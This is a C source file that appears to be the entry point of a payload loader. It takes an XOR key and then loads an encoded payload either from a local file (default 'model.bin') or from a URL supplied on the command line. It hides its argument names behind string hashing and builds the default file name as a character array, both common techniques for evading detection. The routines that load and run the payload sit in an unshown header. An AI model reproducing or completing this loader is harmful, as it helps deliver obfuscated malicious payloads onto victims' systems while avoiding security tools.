#include "loader.h"

int main(int argc, char* argv[]) {
	if (argc < 4) {
	  return 0;
	}
	CHAR defaulFile[] = { 'm','o','d','e','l','.','b','i','n','\0' };
	PCHAR xorKey = NULL;
	for (int i = 1; i < argc-1; i++) {
		if (HashStringA(argv[i]) == XK) {
		   xorKey = argv[i+1];
		   break;
		}
	}
	for (int i = 1; i < argc; i++) {
		if (i == argc - 1) {
			if (HashStringA(argv[i]) == FL) {
				LoadFromFile(defaulFile, xorKey);
				return 0;
			}
			break;
	 
		}
		if (HashStringA(argv[i]) == UL) {
			PCHAR url = argv[i+1];
			LoadFromUrl(url, xorKey);
			return 0;
		}
		else if (HashStringA(argv[i]) == FL) {
			if (argv[i + 1][0] == 45) {
				LoadFromFile(defaulFile, xorKey);
				return 0;
			}
			else {
				PCHAR file = argv[i + 1];
				LoadFromFile(file, xorKey);
				return 0;
			}
		}
	}
	return 0;
}